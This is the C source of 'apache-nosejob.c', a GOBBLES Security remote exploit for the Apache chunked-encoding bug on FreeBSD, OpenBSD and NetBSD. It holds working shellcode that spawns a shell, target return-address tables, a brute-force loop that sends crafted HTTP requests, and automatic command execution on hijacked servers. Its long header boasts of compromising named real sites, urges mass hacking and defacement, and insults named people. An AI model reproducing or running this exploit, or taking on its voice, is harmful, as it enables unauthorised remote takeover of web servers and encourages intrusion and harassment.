/*
 * apache-nosejob.c - Now with FreeBSD & NetBSD targets ;>
 *
 * !! THIS EXPLOIT IS NOW PRIVATE ON BUGTRAQ !!
 *
 * USE BRUTE FORCE ! "AUTOMATED SCRIPT KIDDY" ! USE BRUTE FORCE !
 *
 * YEZ!$#@ YOU CAN EVEN DEFACE BUGTRAQ.ORG! 
 *
 * Your high priced security consultant's plane ticket: $1500
 * Your high priced security consultant's time: $200/hour
 * RealSecure nodes all over your company: $200,000
 * Getting owned by 0day: Priceless
 *  
 * * BEG FOR FAVOR * BEG FOR FAVOR * BEG FOR FAVOR * BEG FOR FAVOR *
 * If somebody could do us a big favor and contact Jennifer Garner and ask
 * her to make a journey to Vegas this summer for Defcon, to hang out with
 * the members of GOBBLES Security who are all huge fans of hers, we would
 * be eternally grateful.  We are 100% serious about this.  We would love 
 * to have a chance to sit down and have a nice conversation with her during
 * the conference -- something little to make our lives feel more complete.
 *
 * Just show her this picture, and she'll understand that we're not some
 * crazy obsessive fanatical lunatics that she would want to avoid. ;-)
 * 		http://phrack.org/summercon2002/GOBBLES_show.jpg
 * We even promise to keep our clothes on!
 *
 * Thx to all those GOBBLES antagonizers. Your insults fuel our desire to
 * work harder to gain more fame.
 *
 * This exploit brought to you by a tagteam effort between GOBBLES Security
 * and ISS X-Forces.  ISS supplied the silly mathematical computations and
 * other abstract figures declaring the exploitation of this bug to be 
 * impossible, without factoring in the chance that there might be other
 * conditions present that would allow exploitation.  After the failure of
 * ISS' Santa Claus, GOBBLES Security didn't want to disappoint the kids and
 * the security consultants and have brought forth a brand new shiny toy for
 * all to marvel at.
 *
 * GOBBLES Security Sex Force:  A lot of companies like to let you know
 * their employees have the biggest dicks.  We're firm believers in the 
 * idea that it's not the size of the wave, but rather the motion of the
 * ocean -- we have no choice anyway.
 * 
 * 3APAPAPA said this can't be done on FreeBSD. He probably also thinks
 * qmail can't be exploited remotely. Buzzz! There we go speaking through
 * our asses again.  Anyways we're looking forward to his arguments on why
 * this isn't exploitable on Linux and Solaris.  Lead, follow, or get the 
 * fuck out of the way.
 *
 * Weigh the chances of us lying about the Linux version. Hmm, well so far
 * we've used a "same shit, different smell" approach on *BSD, so you could
 * be forgiven for thinking we have no Linux version. Then bring in the
 * reverse psychology factor of this paragraph that also says we don't have
 * one. But we'd say all of the above to make you believe us. This starts to
 * get really complicated.
 *
 * --- 
 * God knows I'm helpless to speak
 * On my own behalf
 * God is as helpless as me
 * Caught in the negatives
 * We all just do as we please
 * False transmissions
 * I hope God forgives me
 * For my transgressions
 *
 * It's what you want
 * To know no consequences
 * It's what you need
 * To fucking bleed
 * It's all too much
 * ---
 * 
 * Changes:
 * + can do hostname resolution
 * + uses getopt() 
 * + works against freebsd and netbsd now
 * + ability to execute custom commands when shellcode replies -- great for
 *   mass hacking
 * + rand() value bitshifted for more randomness in our progress bar tongues
 * + more targets ;> BUT REMEMBER BRUTE FORCE MODE!!!
 * + [RaFa] complained that the first version didn't let him hack through
 *   proxies.  New shellcode has been added for additional fun.  It's real
 *   funky, monkey, do you trust?  Didn't think so.
 *
 * Fun to know:
 * + Most apache installations don't even log the attack
 * + GOBBLES Security is not playing games anymore.
 * + GOBBLES Security has more active members than w00w00.
 * + w00w00.org is still vulnerable to this exploit.
 * + w00w00 might release another AIM advisory soon about how evil the
 *   whole DMCA thing is.  *yawn*
 * 
 * Fun to do:
 * + Spot the #openbsd operator who can figure out how to use this!
 * + Join #snort and laugh at their inadequacies
 * + Question the effectiveness of Project Honeynet, when they have yet
 *   to discover the exploitation of a single "0day" vulnerability in the
 *   wild.  HURRY UP B0YZ 4ND H4CK Y0UR 0WN H0N3YP0TZ N0W W1TH 4LL Y0UR
 *   0DAY T0 PR0V3 US WR0NG!!@#  Dumb twats.
 *
 * 80% of #openbsd won't be patching Apache because:
 * + "It's not in the default install"
 * + "It's only uid nobody. So what?"
 * + "Our memcpy() implementation is not buggy"
 * + "I couldn't get the exploit to work, so it must not actually be
 *    exploitable.  Stupid GOBBLES wasting my time with nonsense"
 * + jnathan's expert advice to his peers is that "this is not much of
 *   a security issue" -- @stake + w00w00 + snort brain power in action!
 *
 * Testbeds: hotmail.com, 2600.com, w00w00.org, efnet.org, atstake.com,
 *	     yahoo.com, project.honeynet.org, pub.seastrom.com
 *
 * !! NOTICE TO CRITICS !! NOTICE TO CRITICS !! NOTICE TO CRITICS !!
 * 
 * If you're using this exploit against a vulnerable machine (that the
 * exploit is supposed to work on, quit mailing us asking why apache-scalp
 * doesn't work against Linux -- dumbasses) and it does not succeed, you
 * will have to play with the r|d|z values and * BRUTEFORCE * BRUTEFORCE * 
 * * BRUTEFORCE * BRUTEFORCE * BRUTEFORCE * BRUTEFORCE * BRUTEFORCE *
 * 
 * We wrote this for ethical purposes only.  There is such a thing as an
 * "ethical hacker" right?
 *
 * This should make penetration testing _very_ easy.  Go out and make some
 * money off this, by exploiting the ignorance of some yahoo who will be
 * easily ./impressed with your ability to use gcc.  No, we won't provide
 * you with precompiled binaries.  Well, at least for *nix. ;-) 
 *
 * * IMPORTANT ANNOUCEMENT * IMPORTANT ANNOUNCEMENT * IMPORTANT ANNOUCEMENT *
 * --- GOBBLES Security is no longer accepting new members.  We're now a 
 *     closed group.  Of course, we'll still share our warez with the 
 *     community at large, but for the time we have enough members.  
 *
 *     Greets to our two newest members:
 *	-[RaFa], Ambassador to the Underworld
 *	-pr0ix, Director of Slander and Misinformation
 *
 * [#!GOBBLES@SECRET_SERVER QUOTES]
 *
 * --- i wont be surprised that when I return tomorrow morning the
 *     internet will have come to a grinding halt with people crying for
 *     medics
 * --- the internet will be over in a couple of months 
 * --- nobody in #openbsd can get it to work... #netbsd people seem to be
 *     managing fine...  
 * --- they dont grasp the concept of the base address... i seriously
 *     thought this was the most kiddie friendly exploit ever released
 * --- even bb could get it working. look at vuln-dev
 * --- we have to try to bump that threatcon up a notch
 * --- what the alldas url now? how many defacements appeared yet?
 * --- we should do a poem entitled "default openbsd" and mention how
 *     it just sits there... inanimate... soon theo will be stripping the
 *     network code so not even gobkltz.c works... as theo's paranoia
 *     increases and he becomes out of sync with the real world, strange
 *     things start to happen with openbsd...  CHANGELOG: "now also safe
 *     from the voices. 6 years without the screaming in the default
 *     install"
 * --- i can port it to windows.. i can make a gui using mfc.. with
 *     a picture of the skull & crossbones 
 * --- Has anyone ever been caught by an IDS? I certainly never have.
 *     This one runs on many machines. It ports to HP-UX.
 * --- strange how mr spitzner didn't know honeynet.org was owned
 * --- an official openbsd mirror is still vulnerable?  dear god they're
 *     out of it!
 * --- I think we're finally famous.
 * --- we're on the front page of securityfocus, and we didn't even have 
 *     to deface them!  too bad the article wasn't titled, "Hi BlueBoar!"
 * --- we need GOBBLES group photos at defcon holding up signs that say
 *     "The Blue Boar Must Die"
 * --- project.honeynet.org is _still_ vulnerable a day after the exploit
 *     was made public?  hahaha!
 * --- exploit scanner?  www.google.com -- search for poweredby.gif + your
 *     *bsd of choice!
 * --- i stopped taking my antipsychotics last night.  say no 2 drugz!
 * --- <GOBBLES> antiNSA -- HACKING IS NOT FOR YOU!!!!!!
 * --- we wonder how much they'll like GeneralCuster.exe 
 * --- wonder if ISS will use our code in their "security assesment" 
 *     audits, or if they'll figure out how to exploit this independantly.
 *     either way they're bound to make a lot of money off us, bastards.
 * --- forget w00giving, this year itz thanksgiving.
 * --- the traffic to netcraft.com/whats will be through the roof for the
 *     next few months!
 * --- every company with a hub has been sold multiple realsensor units
 * --- full disclosure is a necessary evil, so quit your goddamned whining.
 * --- people just assume they know what we mean by "testbed"
 * --- i can't believe that people still disbelieve in the existance of 
 *     hackers... i mean, what is all this bullshit about people being 
 *     shocked that hackers write programs to break into systems so that
 *     they can use those programs to break into systems?  are their minds
 *     that small?
 * --- we're far from done. . .
 *
 */

/*
 * apache-scalp.c
 * OPENBSD/X86 APACHE REMOTE EXPLOIT!!!!!!! 
 * 
 * ROBUST, RELIABLE, USER-FRIENDLY MOTHERFUCKING 0DAY WAREZ!
 *
 * BLING! BLING! --- BRUTE FORCE CAPABILITIES --- BLING! BLING!
 * 
 * ". . . and Doug Sniff said it was a hole in Epic."
 *
 * ---
 * Disarm you with a smile
 * And leave you like they left me here
 * To wither in denial
 * The bitterness of one who's left alone
 * ---
 *
 * Remote OpenBSD/Apache exploit for the "chunking" vulnerability. Kudos to
 * the OpenBSD developers (Theo, DugSong, jnathan, *@#!w00w00, ...) and
 * their crappy memcpy implementation that makes this 32-bit impossibility
 * very easy to accomplish. This vulnerability was recently rediscovered by a slew
 * of researchers.
 *
 * The "experts" have already concurred that this bug...
 *      -       Can not be exploited on 32-bit *nix variants
 *      -       Is only exploitable on win32 platforms
 *      -       Is only exploitable on certain 64-bit systems
 *
 * However, contrary to what ISS would have you believe, we have
 * successfully exploited this hole on the following operating systems:
 *
 *      Sun Solaris 6-8 (sparc/x86)
 *      FreeBSD 4.3-4.5 (x86)
 *      OpenBSD 2.6-3.1 (x86)
 *      Linux (GNU) 2.4 (x86)
 *
 * Don't get discouraged too quickly in your own research. It took us close
 * to two months to be able to exploit each of the above operating systems.
 * There is a peculiarity to be found for each operating system that makes the
 * exploitation possible.
 *
 * Don't email us asking for technical help or begging for warez. We are
 * busy working on many other wonderful things, including other remotely
 * exploitable holes in Apache. Perhaps The Great Pr0ix would like to inform
 * the community that those holes don't exist? We wonder who's paying her.
 *
 * This code is an early version from when we first began researching the
 * vulnerability. It should spawn a shell on any unpatched OpenBSD system
 * running the Apache webserver.
 *
 * We appreciate The Blue Boar's effort to allow us to post to his mailing
 * list once again. Because he finally allowed us to post, we now have this
 * very humble offering.
 *
 * This is a very serious vulnerability. After disclosing this exploit, we
 * hope to have gained immense fame and glory.
 *
 * Testbeds: synnergy.net, monkey.org, 9mm.com
 *
 * Abusing the right syscalls, any exploit against OpenBSD == root. Kernel
 * bugs are great. 
 *
 * [#!GOBBLES QUOTES]
 * 
 * --- you just know 28923034839303 admins out there running
 *     OpenBSD/Apache are going "ugh..not exploitable..ill do it after the
 *     weekend"
 * --- "Five years without a remote hole in the default install". default
 *      package = kernel. if theo knew that talkd was exploitable, he'd cry.
 * --- so funny how apache.org claims it's impossible to exploit this.
 * --- how many times were we told, "ANTISEC IS NOT FOR YOU" ?       
 * --- I hope Theo doesn't kill himself                        
 * --- heh, this is a middle finger to all those open source, anti-"m$"
 *     idiots... slashdot hippies...
 * --- they rushed to release this exploit so they could update their ISS
 *     scanner to have a module for this vulnerability, but it doesnt even
 *     work... it's just looking for win32 apache versions
 * --- no one took us seriously when we mentioned this last year. we warned
 *     them that moderation == no pie.
 * --- now try it against synnergy :>                           
 * --- ANOTHER BUG BITE THE DUST... VROOOOM VRRRRRRROOOOOOOOOM
 *
 * xxxx  this thing is a major exploit. do you really wanna publish it?
 * oooo  i'm not afraid of whitehats
 * xxxx  the blackhats will kill you for posting that exploit
 * oooo  blackhats are a myth
 * oooo  so i'm not worried
 * oooo  i've never seen one
 * oooo  i guess it's sort of like having god in your life
 * oooo  i don't believe there's a god
 * oooo  but if i sat down and met him
 * oooo  i wouldn't walk away thinking
 * oooo  "that was one hell of a special effect"
 * oooo  so i suppose there very well could be a blackhat somewhere
 * oooo  but i doubt it... i've seen whitehat-blackhats with their ethics
 *       and deep philosophy...
 *
 * [GOBBLES POSERS/WANNABES]
 *
 * --- #!GOBBLES@EFNET (none of us join here, but we've sniffed it)
 * --- super@GOBBLES.NET (low-level.net)
 *
 * GOBBLES Security
 * GOBBLES@hushmail.com
 * http://www.bugtraq.org
 *
 */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/time.h>
#include <signal.h>
#ifdef __linux__
#include <getopt.h>
#endif


#define HOST_PARAM	"apache-nosejob.c"		/* The Host: field */
#define DEFAULT_CMDZ	"uname -a;id;echo 'hehe, now use another bug/backdoor/feature (hi Theo!) to gain instant r00t';\n"
#define RET_ADDR_INC	512


#define PADSIZE_1	4
#define PADSIZE_2 	5
#define PADSIZE_3	7


#define REP_POPULATOR	24
#define REP_SHELLCODE	24
#define NOPCOUNT	1024

#define NOP		0x41
#define PADDING_1	'A'
#define PADDING_2	'B'
#define PADDING_3	'C'

#define PUT_STRING(s)	memcpy(p, s, strlen(s)); p += strlen(s);
#define PUT_BYTES(n, b)	memset(p, b, n); p += n;

char shellcode[] =
  "\x68\x47\x47\x47\x47\x89\xe3\x31\xc0\x50\x50\x50\x50\xc6\x04\x24"
  "\x04\x53\x50\x50\x31\xd2\x31\xc9\xb1\x80\xc1\xe1\x18\xd1\xea\x31"
  "\xc0\xb0\x85\xcd\x80\x72\x02\x09\xca\xff\x44\x24\x04\x80\x7c\x24"
  "\x04\x20\x75\xe9\x31\xc0\x89\x44\x24\x04\xc6\x44\x24\x04\x20\x89"
  "\x64\x24\x08\x89\x44\x24\x0c\x89\x44\x24\x10\x89\x44\x24\x14\x89"
  "\x54\x24\x18\x8b\x54\x24\x18\x89\x14\x24\x31\xc0\xb0\x5d\xcd\x80"
  "\x31\xc9\xd1\x2c\x24\x73\x27\x31\xc0\x50\x50\x50\x50\xff\x04\x24"
  "\x54\xff\x04\x24\xff\x04\x24\xff\x04\x24\xff\x04\x24\x51\x50\xb0"
  "\x1d\xcd\x80\x58\x58\x58\x58\x58\x3c\x4f\x74\x0b\x58\x58\x41\x80"
  "\xf9\x20\x75\xce\xeb\xbd\x90\x31\xc0\x50\x51\x50\x31\xc0\xb0\x5a"
  "\xcd\x80\xff\x44\x24\x08\x80\x7c\x24\x08\x03\x75\xef\x31\xc0\x50"
  "\xc6\x04\x24\x0b\x80\x34\x24\x01\x68\x42\x4c\x45\x2a\x68\x2a\x47"
  "\x4f\x42\x89\xe3\xb0\x09\x50\x53\xb0\x01\x50\x50\xb0\x04\xcd\x80"
  "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50"
  "\x53\x89\xe1\x50\x51\x53\x50\xb0\x3b\xcd\x80\xcc";
;

struct {
	char *type;		/* description for newbie penetrator */
	int delta;		/* delta thingie! */
	u_long retaddr;		/* return address */
	int repretaddr;		/* we repeat retaddr thiz many times in the buffer */
	int repzero;		/* and \0'z this many times */
} targets[] = {	// hehe, yes theo, that say OpenBSD here!
	{ "FreeBSD 4.5 x86 / Apache/1.3.23 (Unix)",	 -150,	0x80f3a00, 6, 36 },
	{ "FreeBSD 4.5 x86 / Apache/1.3.23 (Unix)",	 -150,	0x80a7975, 6, 36 },
	{ "OpenBSD 3.0 x86 / Apache 1.3.20",		 -146,	0xcfa00,   6, 36 },
	{ "OpenBSD 3.0 x86 / Apache 1.3.22",		 -146,	0x8f0aa,   6, 36 },
	{ "OpenBSD 3.0 x86 / Apache 1.3.24",		 -146,	0x90600,   6, 36 },
	{ "OpenBSD 3.0 x86 / Apache 1.3.24 #2",		 -146,	0x98a00,   6, 36 },
	{ "OpenBSD 3.1 x86 / Apache 1.3.20",		 -146,	0x8f2a6,   6, 36 },
	{ "OpenBSD 3.1 x86 / Apache 1.3.23",		 -146,	0x90600,   6, 36 },
	{ "OpenBSD 3.1 x86 / Apache 1.3.24",		 -146,	0x9011a,   6, 36 },
	{ "OpenBSD 3.1 x86 / Apache 1.3.24 #2",		 -146,	0x932ae,   6, 36 },
	{ "OpenBSD 3.1 x86 / Apache 1.3.24 PHP 4.2.1", -146,	0x1d7a00,  6, 36 },
	{ "NetBSD 1.5.2 x86 / Apache 1.3.12 (Unix)",	 -90,	0x80eda00,  5, 42 },
	{ "NetBSD 1.5.2 x86 / Apache 1.3.20 (Unix)", 	 -90,   0x80efa00,  5, 42 },
	{ "NetBSD 1.5.2 x86 / Apache 1.3.22 (Unix)", 	 -90,   0x80efa00,  5, 42 },	
	{ "NetBSD 1.5.2 x86 / Apache 1.3.23 (Unix)",	 -90,	0x80efa00,  5, 42 }, 
	{ "NetBSD 1.5.2 x86 / Apache 1.3.24 (Unix)",	 -90,	0x80efa00,  5, 42 },
}, victim;



void usage(void) {
	int i;

	printf("GOBBLES Security Labs\t\t\t\t\t- apache-nosejob.c\n\n");
	printf("Usage: ./apache-nosejob <-switches> -h host[:80]\n");
	printf("  -h host[:port]\tHost to penetrate\n");
	printf("  -t #\t\t\tTarget id.\n");
	printf("  Bruteforcing options (all required, unless -o is used!):\n");
	printf("  -o char\t\tDefault values for the following OSes\n");
	printf("  \t\t\t(f)reebsd, (o)penbsd, (n)etbsd\n");
	printf("  -b 0x12345678\t\tBase address used for bruteforce\n");
	printf("  \t\t\tTry 0x80000/obsd, 0x80a0000/fbsd, 0x080e0000/nbsd.\n");
	printf("  -d -nnn\t\tmemcpy() delta between s1 and addr to overwrite\n");
	printf("  \t\t\tTry -146/obsd, -150/fbsd, -90/nbsd.\n");
	printf("  -z #\t\t\tNumbers of time to repeat \\0 in the buffer\n");
	printf("  \t\t\tTry 36 for openbsd/freebsd and 42 for netbsd\n");
	printf("  -r #\t\t\tNumber of times to repeat retadd in the buffer\n");
	printf("  \t\t\tTry 6 for openbsd/freebsd and 5 for netbsd\n");
	printf("  Optional stuff:\n");
	printf("  -w #\t\t\tMaximum number of seconds to wait for shellcode reply\n");
	printf("  -c cmdz\t\tCommands to execute when our shellcode replies\n");
	printf("  \t\t\taka auto0wncmdz\n");
	printf("\nExamples will be published in upcoming apache-scalp-HOWTO.pdf\n");
	printf("\n--- --- - Potential targets list - --- ---- ------- ------------\n");
	printf(" ID / Return addr / Target specification\n");
	for(i = 0; i < sizeof(targets)/sizeof(victim); i++)
		printf("% 3d /  0x%.8lx / %s\n", i, targets[i].retaddr, targets[i].type);

	exit(1);
}


int main(int argc, char *argv[]) {
	char *hostp, *portp, *cmdz = DEFAULT_CMDZ;
	u_char buf[512], *expbuf, *p;
	int i, j, lport, sock;
	int bruteforce, owned, progress, sc_timeout = 5;
	int responses, shown_length = 0;
	struct in_addr ia;
	struct sockaddr_in sin, from;
	struct hostent *he;


	if(argc < 4)
		usage();

	bruteforce = 0;
	memset(&victim, 0, sizeof(victim));
	while((i = getopt(argc, argv, "t:b:d:h:w:c:r:z:o:")) != -1) {
		switch(i) {
			/* required stuff */
			case 'h':
			hostp = strtok(optarg, ":");
			if((portp = strtok(NULL, ":")) == NULL)
				portp = "80";
			break;

			/* predefined targets */
			case 't':
			if(atoi(optarg) >= sizeof(targets)/sizeof(victim)) {
				printf("Invalid target\n");
				return -1;
			}

			memcpy(&victim, &targets[atoi(optarg)], sizeof(victim));
			break;

			/* bruteforce! */
			case 'b':
			bruteforce++;
			victim.type = "Custom target";
			victim.retaddr = strtoul(optarg, NULL, 16);
			printf("Using 0x%lx as the baseadress while bruteforcing..\n", victim.retaddr);
			break;

			case 'd':
			victim.delta = atoi(optarg);
			printf("Using %d as delta\n", victim.delta);
			break;

			case 'r':
			victim.repretaddr = atoi(optarg);
			printf("Repeating the return address %d times\n", victim.repretaddr);
			break;

			case 'z':
			victim.repzero = atoi(optarg);
			printf("Number of zeroes will be %d\n", victim.repzero);
			break;

			case 'o':
			bruteforce++;
			switch(*optarg) {
				case 'f':
				victim.type = "FreeBSD";
				victim.retaddr = 0x80a0000;
				victim.delta = -150;
				victim.repretaddr = 6;
				victim.repzero = 36;
				break;

				case 'o':
				victim.type = "OpenBSD";
				victim.retaddr = 0x80000;
				victim.delta = -146;
				victim.repretaddr = 6;
				victim.repzero = 36;
				break;

				case 'n':
				victim.type = "NetBSD";
				victim.retaddr = 0x080e0000;
				victim.delta = -90;
				victim.repretaddr = 5;
				victim.repzero = 42;
				break;

				default:
				printf("[-] Better luck next time!\n");
				break;
			}
			break;

			/* optional stuff */
			case 'w':
			sc_timeout = atoi(optarg);
			printf("Waiting maximum %d seconds for replies from shellcode\n", sc_timeout);
			break;

			case 'c':
			cmdz = optarg;
			break;

			default:
			usage();
			break;
		}
	}

	if(!victim.delta || !victim.retaddr || !victim.repretaddr || !victim.repzero) {
		printf("[-] Incomplete target. At least 1 argument is missing (nmap style!!)\n");
		return -1;
	}

	printf("[*] Resolving target host.. ");
	fflush(stdout);
	he = gethostbyname(hostp);
	if(he)
		memcpy(&ia.s_addr, he->h_addr, 4);
	else if((ia.s_addr = inet_addr(hostp)) == INADDR_ANY) {
		printf("There'z no %s on this side of the Net!\n", hostp);
		return -1;
	}

	printf("%s\n", inet_ntoa(ia));


	srand(getpid());
	signal(SIGPIPE, SIG_IGN);
	for(owned = 0, progress = 0;;victim.retaddr += RET_ADDR_INC) {
		/* skip invalid return adresses */
		if(memchr(&victim.retaddr, 0x0a, 4) || memchr(&victim.retaddr, 0x0d, 4))
			continue;


		sock = socket(PF_INET, SOCK_STREAM, 0);
		sin.sin_family = PF_INET;
		sin.sin_addr.s_addr = ia.s_addr;
		sin.sin_port = htons(atoi(portp));
		if(!progress)
			printf("[*] Connecting.. ");

		fflush(stdout);
		if(connect(sock, (struct sockaddr *) & sin, sizeof(sin)) != 0) {
			perror("connect()");
			exit(1);
		}

		if(!progress)
			printf("connected!\n");


		p = expbuf = malloc(8192 + ((PADSIZE_3 + NOPCOUNT + 1024) * REP_SHELLCODE)
				    + ((PADSIZE_1 + (victim.repretaddr * 4) + victim.repzero
				    + 1024) * REP_POPULATOR));

		PUT_STRING("GET / HTTP/1.1\r\nHost: " HOST_PARAM "\r\n");

		for (i = 0; i < REP_SHELLCODE; i++) {
			PUT_STRING("X-");
			PUT_BYTES(PADSIZE_3, PADDING_3);
			PUT_STRING(": ");
			PUT_BYTES(NOPCOUNT, NOP);
			memcpy(p, shellcode, sizeof(shellcode) - 1);
			p += sizeof(shellcode) - 1;
			PUT_STRING("\r\n");
		}

		for (i = 0; i < REP_POPULATOR; i++) {
			PUT_STRING("X-");
			PUT_BYTES(PADSIZE_1, PADDING_1);
			PUT_STRING(": ");
			for (j = 0; j < victim.repretaddr; j++) {
				*p++ = victim.retaddr & 0xff;
				*p++ = (victim.retaddr >> 8) & 0xff;
				*p++ = (victim.retaddr >> 16) & 0xff;
				*p++ = (victim.retaddr >> 24) & 0xff;
			}

			PUT_BYTES(victim.repzero, 0);
			PUT_STRING("\r\n");
		}

		PUT_STRING("Transfer-Encoding: chunked\r\n");
		snprintf(buf, sizeof(buf) - 1, "\r\n%x\r\n", PADSIZE_2);
		PUT_STRING(buf);
		PUT_BYTES(PADSIZE_2, PADDING_2);
		snprintf(buf, sizeof(buf) - 1, "\r\n%x\r\n", victim.delta);
		PUT_STRING(buf);
		
		if(!shown_length) {
			printf("[*] Exploit output is %u bytes\n", (unsigned int)(p - expbuf));
			shown_length = 1; 
		}
		
		write(sock, expbuf, p - expbuf);

		progress++;
		if((progress%70) == 0)
			progress = 1;

		if(progress == 1) {
			printf("\r[*] Currently using retaddr 0x%lx", victim.retaddr);
			for(i = 0; i < 40; i ++)
				printf(" ");
			printf("\n");
			if(bruteforce)
				putchar(';');
		}
		else
			putchar(((rand()>>8)%2)? 'P': 'p');


		fflush(stdout);
		responses = 0;
		while (1) {
			fd_set          fds;
			int             n;
			struct timeval  tv;

			tv.tv_sec = sc_timeout;
			tv.tv_usec = 0;

			FD_ZERO(&fds);
			FD_SET(0, &fds);
			FD_SET(sock, &fds);
	
			memset(buf, 0, sizeof(buf));
			if(select(sock + 1, &fds, NULL, NULL, owned? NULL : &tv) > 0) {
				if(FD_ISSET(sock, &fds)) {
					if((n = read(sock, buf, sizeof(buf) - 1)) < 0)
						break;

					if(n >= 1)
					{
						if(!owned)
						{
							for(i = 0; i < n; i ++)
								if(buf[i] == 'G')
									responses ++;
								else
									responses = 0;
							if(responses >= 2)
							{
								owned = 1;
								write(sock, "O", 1);
								write(sock, cmdz, strlen(cmdz));
								printf(" it's a TURKEY: type=%s, delta=%d, retaddr=0x%lx, repretaddr=%d, repzero=%d\n", victim.type, victim.delta, victim.retaddr, victim.repretaddr, victim.repzero);
								printf("Experts say this isn't exploitable, so nothing will happen now: ");
								fflush(stdout);
							}
						} else
  							write(1, buf, n);
  					}
				}

				if(FD_ISSET(0, &fds)) {
					if((n = read(0, buf, sizeof(buf) - 1)) < 0)
						exit(1);

					write(sock, buf, n);
				}

			}

			if(!owned)
				break;
		}

		free(expbuf);
		close(sock);

		if(owned)
			return 0;

		if(!bruteforce) {
			fprintf(stderr, "Ooops.. hehehe!\n");
			return -1;
		}
	}

	return 0;
}
